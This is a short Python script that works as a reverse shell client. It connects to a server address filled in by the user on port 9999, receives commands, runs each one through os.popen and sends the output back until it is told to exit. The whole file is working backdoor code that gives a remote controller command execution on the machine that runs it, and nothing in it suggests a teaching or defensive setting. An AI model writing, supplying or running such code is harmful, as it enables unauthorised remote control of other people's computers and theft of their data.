import socket
import os

# Server configuration
SERVER_HOST = 'your_server_ip'  # Replace 'your_server_ip' with the actual IP address of your server
SERVER_PORT = 9999

def connect_to_server():
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((SERVER_HOST, SERVER_PORT))

    while True:
        try:
            command = client.recv(1024).decode('utf-8')
            if command.lower() == 'exit':
                print("[*] Exiting...")
                break

            # Execute the command and get the output
            output = os.popen(command).read()
            if not output:
                output = "Command executed but no output returned."
            
            client.sendall(output.encode())
        except Exception as e:
            print(f"[!] Error: {e}")
            break

if __name__ == "__main__":
    connect_to_server()
